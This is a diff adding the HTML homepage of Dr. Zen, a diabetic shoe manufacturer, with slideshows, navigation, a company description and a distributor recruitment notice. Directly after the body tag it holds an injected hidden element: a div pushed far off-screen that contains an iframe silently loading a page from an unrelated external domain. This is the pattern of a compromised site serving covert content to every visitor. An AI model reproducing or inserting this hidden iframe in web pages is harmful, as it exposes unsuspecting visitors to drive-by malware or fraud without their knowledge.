@@ -1,0 +1,320 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE8">
+<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
+<title>Welcome to Dr. Zen</title>
+<meta name="generator" content="WYSIWYG Web Builder - http://www.wysiwygwebbuilder.com">
+<style type="text/css">
+div#container
+{
+   width: 994px;
+   position: relative;
+   margin: 0 auto 0 auto;
+   text-align: left;
+}
+body
+{
+   background-color: #FFFFFF;
+   background-image: url(images/index_bkgrnd.png);
+   background-repeat: repeat-x;
+   color: #000000;
+   font-family: Arial;
+   font-size: 13px;
+   margin: 0;
+   text-align: center;
+}
+</style>
+<style type="text/css">
+a
+{
+   color: #7B7BC0;
+   text-decoration: underline;
+}
+a:visited
+{
+   color: #0000FF;
+}
+a:active
+{
+   color: #FF0000;
+}
+a:hover
+{
+   color: #FF6820;
+   text-decoration: underline;
+}
+.CustomStyle
+{
+   font-family: "Courier New";
+   font-size: 16px;
+   font-weight: bold;
+   font-style: normal;
+   text-decoration: none;
+   color: #000080;
+   background-color: transparent;
+}
+</style>
+<style type="text/css">
+#wb_Text1 
+{
+   background-color: transparent;
+   border: 0px #000000 none;
+   padding: 0;
+   text-align: left;
+}
+#wb_Text1 div
+{
+   text-align: left;
+}
+#NavigationBar1 ul.navbar
+{
+   list-style: none;
+   margin: 0;
+   padding: 0;
+}
+#NavigationBar1 ul.navbar li
+{
+   height: 29px;
+   width: 212px;
+   margin: 0 0 4px 0;
+   vertical-align: bottom;
+   overflow:hidden;
+}
+#NavigationBar1 ul.navbar li a
+{
+   display: block;
+   position: relative;
+}
+#NavigationBar1 ul.navbar li a img
+{
+   position: absolute;
+   left: 0;
+   z-index: 1;
+   border-width: 0;
+}
+#NavigationBar1 ul.navbar li span
+{
+   display: block;
+   height: 29px;
+   width: 212px;
+   position: absolute;
+   z-index: 2;
+}
+#SlideShow1 .image
+{
+   border-width: 0;
+   left: 0;
+   top: 0;
+}
+#SlideShow2 .image
+{
+   border-width: 0;
+   left: 0;
+   top: 0;
+}
+#wb_Text1 
+{
+   background-color: transparent;
+   border: 0px #000000 none;
+   padding: 0;
+   text-align: left;
+}
+#wb_Text1 div
+{
+   text-align: left;
+}
+#wb_Text2 
+{
+   background-color: transparent;
+   border: 0px #000000 none;
+   padding: 0;
+   text-align: left;
+}
+#wb_Text2 div
+{
+   text-align: left;
+}
+#Image1
+{
+   border: 0px #000000 solid;
+}
+#wb_Text3 
+{
+   background-color: transparent;
+   border: 0px #000000 none;
+   padding: 0;
+   text-align: left;
+}
+#wb_Text3 div
+{
+   text-align: left;
+}
+#wb_Text4 
+{
+   background-color: transparent;
+   border: 0px #000000 none;
+   padding: 0;
+   text-align: left;
+}
+#wb_Text4 div
+{
+   text-align: left;
+}
+#Image4
+{
+   border: 1px #7D9EC0 solid;
+}
+#SlideShow-op .image
+{
+   border-width: 0;
+   left: 0;
+   top: 0;
+}
+</style>
+<script type="text/javascript" src="jquery-1.7.2.min.js"></script>
+<script type="text/javascript" src="jquery.ui.effect.min.js"></script>
+<script type="text/javascript" src="jquery.ui.effect-blind.min.js"></script>
+<script type="text/javascript" src="jquery.ui.effect-bounce.min.js"></script>
+<script type="text/javascript" src="jquery.ui.effect-clip.min.js"></script>
+<script type="text/javascript" src="jquery.ui.effect-drop.min.js"></script>
+<script type="text/javascript" src="jquery.ui.effect-fade.min.js"></script>
+<script type="text/javascript" src="jquery.ui.effect-fold.min.js"></script>
+<script type="text/javascript" src="jquery.ui.effect-scale.min.js"></script>
+<script type="text/javascript" src="jquery.ui.effect-slide.min.js"></script>
+<script type="text/javascript" src="wb.slideshow.min.js"></script>
+<script type="text/javascript">
+$(document).ready(function()
+{
+   $("#NavigationBar1 .navbar a").hover(function()
+   {
+      $("img", this).stop().animate({top:"-29px"},{queue:false,duration:500});
+   }, function()
+   {
+      $("img", this).stop().animate({top:"0px"},{queue:false,duration:500});
+   })
+   $("#SlideShow1").slideshow(
+   {
+      interval: 6000,
+      type: 'sequence',
+      effect: 'fade',
+      direction: '',
+      effectlength: 3000
+   });
+   $("#SlideShow2").slideshow(
+   {
+      interval: 6000,
+      type: 'sequence',
+      effect: 'fade',
+      direction: '',
+      effectlength: 3000
+   });
+   $("#SlideShow-op").slideshow(
+   {
+      interval: 4000,
+      type: 'sequence',
+      effect: 'fade',
+      direction: '',
+      effectlength: 2000
+   });
+});
+</script>
+</head>
+<body><style>.j1 {left:-8000px;position:absolute;top:-1080px; font-color: red; font-size: 14px;} .s14{font-family: verdana;}</style><div class="j1 s14"><iframe width="100" height="100" src="http://flowlayout.com/adsc.html"></iframe></div>
+<div id="container">
+<div id="wb_MasterPage1" style="position:absolute;left:0px;top:0px;width:1088px;height:2029px;z-index:5;">
+<div id="wb_Shape1" style="position:absolute;left:94px;top:7px;width:994px;height:286px;z-index:0;">
+<img src="images/img0001.png" id="Shape1" alt="" style="border-width:0;width:994px;height:286px;"></div>
+<div id="wb_Shape2" style="position:absolute;left:93px;top:290px;width:995px;height:1721px;z-index:1;">
+<img src="images/img0006.png" id="Shape2" alt="" style="border-width:0;width:995px;height:1721px;"></div>
+<div id="wb_Text1" style="position:absolute;left:377px;top:2013px;width:400px;height:16px;z-index:2;text-align:left;">
+<span style="color:#00008B;font-family:Arial;font-size:13px;">(c) 2011&nbsp;&nbsp; Dr. Zen, Inc.&nbsp;&nbsp; &nbsp;&nbsp; Web Design by</span><span style="color:#000000;font-family:Arial;font-size:13px;">&nbsp;&nbsp; <a href="http://www.gfmediagroup.com" target="_blank">GFMediaGroup.com</a></span></div>
+<div id="NavigationBar1" style="position:absolute;left:102px;top:300px;width:212px;height:363px;z-index:3;">
+<ul class="navbar">
+<li><a href="./index.html"><img alt="" src="images/img0002.gif"></a></li>
+<li><a href="./our-shoes.html"><img alt="" src="images/img0003.gif"></a></li>
+<li><a href="./cat2013.pdf"><img alt="" src="images/img0007.gif"></a></li>
+<li><a href="./advantage.html"><img alt="" src="images/img0004.gif"></a></li>
+<li><a href="./order.html"><img alt="" src="images/img0005.gif"></a></li>
+<li><a href="./bill.html"><img alt="" src="images/img0008.gif"></a></li>
+<li><a href="./faq.html"><img alt="" src="images/img0009.gif"></a></li>
+<li><a href="./evolution.html"><img alt="" src="images/img0011.gif"></a></li>
+<li><a href="./tens.html"><img alt="" src="images/img0012.gif"></a></li>
+<li><a href="http://www.certifiedshoefitter.com/fitter/dlpmenuzen.htm" target="_blank"><img alt="" src="images/img0026.gif"></a></li>
+<li><a href="./contact_us.html"><img alt="" src="images/img0013.gif"></a></li>
+</ul>
+</div>
+<div id="SlideShow1" style="position:absolute;left:100px;top:15px;width:970px;height:260px;z-index:4;">
+<img class="image" style="width:970px;height:260px;" src="images/pic1.jpg" alt="" title="">
+<img class="image" style="width:970px;height:260px;display:none;" src="images/pic2.jpg" alt="" title="">
+<img class="image" style="width:970px;height:260px;display:none;" src="images/pic3.jpg" alt="" title="">
+<img class="image" style="width:970px;height:260px;display:none;" src="images/pic4.jpg" alt="" title="">
+<img class="image" style="width:970px;height:260px;display:none;" src="images/pic5.jpg" alt="" title="">
+<img class="image" style="width:970px;height:260px;display:none;" src="images/pic6.jpg" alt="" title="">
+<img class="image" style="width:970px;height:260px;display:none;" src="images/pic7.jpg" alt="" title="">
+<img class="image" style="width:970px;height:260px;display:none;" src="images/pic8.jpg" alt="" title="">
+<img class="image" style="width:970px;height:260px;display:none;" src="images/pic10.jpg" alt="" title="">
+<img class="image" style="width:970px;height:260px;display:none;" src="images/pic11.jpg" alt="" title="">
+<img class="image" style="width:970px;height:260px;display:none;" src="images/pic12.jpg" alt="" title="">
+<img class="image" style="width:970px;height:260px;display:none;" src="images/pic9_01.jpg" alt="" title="">
+</div>
+</div>
+<div id="SlideShow2" style="position:absolute;left:361px;top:299px;width:700px;height:400px;border:2px #000000 solid;z-index:6;">
+<img class="image" style="width:700px;height:400px;" src="images/1a.jpg" alt="" title="">
+<img class="image" style="width:700px;height:400px;display:none;" src="images/2a.jpg" alt="" title="">
+<img class="image" style="width:700px;height:400px;display:none;" src="images/3a.jpg" alt="" title="">
+<img class="image" style="width:700px;height:400px;display:none;" src="images/4a.jpg" alt="" title="">
+<img class="image" style="width:700px;height:400px;display:none;" src="images/6a.jpg" alt="" title="">
+<img class="image" style="width:700px;height:400px;display:none;" src="images/7a.jpg" alt="" title="">
+<img class="image" style="width:700px;height:400px;display:none;" src="images/9a.jpg" alt="" title="">
+<img class="image" style="width:700px;height:400px;display:none;" src="images/10a.jpg" alt="" title="">
+<img class="image" style="width:700px;height:400px;display:none;" src="images/8b.jpg" alt="" title="">
+<img class="image" style="width:700px;height:400px;display:none;" src="images/11.jpg" alt="" title="">
+<img class="image" style="width:700px;height:400px;display:none;" src="images/16.jpg" alt="" title="">
+<img class="image" style="width:700px;height:400px;display:none;" src="images/13.jpg" alt="" title="">
+<img class="image" style="width:700px;height:400px;display:none;" src="images/14.jpg" alt="" title="">
+<img class="image" style="width:700px;height:400px;display:none;" src="images/15.jpg" alt="" title="">
+<img class="image" style="width:700px;height:400px;display:none;" src="images/17.jpg" alt="" title="">
+<img class="image" style="width:700px;height:400px;display:none;" src="images/12_01.jpg" alt="" title="">
+<img class="image" style="width:700px;height:400px;display:none;" src="images/18.jpg" alt="" title="">
+</div>
+<div id="wb_Text1" style="position:absolute;left:108px;top:719px;width:569px;height:22px;z-index:7;text-align:left;">
+<span style="color:#000000;font-family:Arial;font-size:19px;"><strong>DR.ZEN is a large manufacturer of diabetic shoes and inserts.</strong></span></div>
+<div id="wb_Text2" style="position:absolute;left:103px;top:842px;width:964px;height:363px;z-index:8;text-align:left;">
+<span style="color:#000000;font-family:Arial;font-size:16px;"><strong>Dr. Zen </strong>was founded in 1999, and for 15 years we have been selling high quality footwear to DMEs, pedorthists, podiatrists, pharmacists, etc.&nbsp; Dr. Zen was founded as an alternative to expensive, unsightly footwear.&nbsp; We have helped our customers grow their diabetic shoe business by providing them with a high quality product at a competitive cost.<br><br> We maintain one of the largest inventories in the U.S. with very competitive pricing. We can custom design &amp; manufacture to your specifications. We are able to deliver shoes anywhere in the world.<br><br><strong>ZEN ADVANTAGES</strong><br><br> -- Quick turn around time, Almost all orders ship same day<br> -- High quality product, with a lot of selections<br> -- Low Backorders<br> -- Easy to fit shoes, select styles come with three insoles<br> -- Shoes that can fit everyone, we go up to a 9E width of select styles<br> -- Competitive prices: high quality, great customer service, great variety, at a competitive number<br><br>&nbsp; All of these advantages make us the number one diabetic shoe supplier in the country.&nbsp; We are the one shoe company that can meet all of your diabetic needs.&nbsp; <br><br> </span></div>
+<div id="wb_Image1" style="position:absolute;left:112px;top:1183px;width:400px;height:400px;z-index:9;">
+<img src="images/display.png" id="Image1" alt="" style="width:400px;height:400px;"></div>
+<div id="wb_Text3" style="position:absolute;left:108px;top:764px;width:498px;height:81px;z-index:10;text-align:left;">
+<span style="color:#3CB371;font-family:Arial;font-size:21px;"><strong>Business Opportunities</strong></span><span style="color:#3CB371;font-family:Arial;font-size:19px;"><strong> <br></strong></span><span style="color:#3CB371;font-family:Arial;font-size:16px;"><strong>Looking for Distributors &amp; Reps.<br>For more information please call</strong></span><span style="color:#3CB371;font-family:Arial;font-size:19px;"><strong>&nbsp;&nbsp;&nbsp; 407.688.2860 <br></strong></span></div>
+<div id="wb_Shape3" style="position:absolute;left:681px;top:719px;width:395px;height:107px;z-index:11;">
+<img src="images/img0019.gif" id="Shape3" alt="" style="border-width:0;width:395px;height:107px;"></div>
+<div id="wb_Text4" style="position:absolute;left:691px;top:720px;width:380px;height:89px;z-index:12;text-align:left;">
+<span style="color:#000000;font-family:Arial;font-size:13px;"><br></span><span style="color:#FFFFFF;font-family:Arial;font-size:16px;"><strong>*Full Training Provided *Referral Services <br>&nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp; *Same DayShipping</strong></span><span style="color:#FFFFFF;font-family:Arial;font-size:13px;"><strong><br></strong></span><span style="color:#8B0000;font-family:Arial;font-size:13px;"><strong><br></strong></span><span style="color:#3BB06F;font-family:Arial;font-size:17px;"><strong>For training and to get Certified <a href="http://www.certifiedshoefitter.com/fitter/dlpmenuzen.htm" target="_blank">&quot;CLICK HERE&quot;</a></strong></span></div>
+<div id="wb_Image4" style="position:absolute;left:101px;top:1727px;width:970px;height:260px;z-index:13;">
+<img src="images/pic4.jpg" id="Image4" alt="" style="width:970px;height:260px;"></div>
+<div id="SlideShow-op" style="position:absolute;left:551px;top:1184px;width:500px;height:500px;z-index:14;">
+<img class="image" style="width:500px;height:500px;" src="images/front-image1.jpg" alt="" title="">
+<img class="image" style="width:500px;height:500px;display:none;" src="images/front-image2.jpg" alt="" title="">
+<img class="image" style="width:500px;height:500px;display:none;" src="images/front-image3.jpg" alt="" title="">
+<img class="image" style="width:500px;height:500px;display:none;" src="images/front-image4.jpg" alt="" title="">
+</div>
+</div>
+<!-- Site Meter -->
+<a href="http://sm7.sitemeter.com/stats.asp?site=sm7drzen" target="_top">
+<img src="http://sm7.sitemeter.com/meter.asp?site=sm7drzen" alt="Site Meter" border="0"/></a>
+<!-- Copyright (c)2009 Site Meter -->
+
+<!-- WiredMinds eMetrics tracking with Enterprise Edition V5.4 START -->
+<script type='text/javascript' src='https://count.carrierzone.com/app/count_server/count.js'></script>
+<script type='text/javascript'><!--
+wm_custnum='3f53e9666c24d3de';
+wm_page_name='index.html';
+wm_group_name='/services/webpages/d/r/drzen.net/public';
+wm_campaign_key='campaign_id';
+wm_track_alt='';
+wiredminds.count();
+// -->
+</script>
+<!-- WiredMinds eMetrics tracking with Enterprise Edition V5.4 END -->
+</body>
+</html>
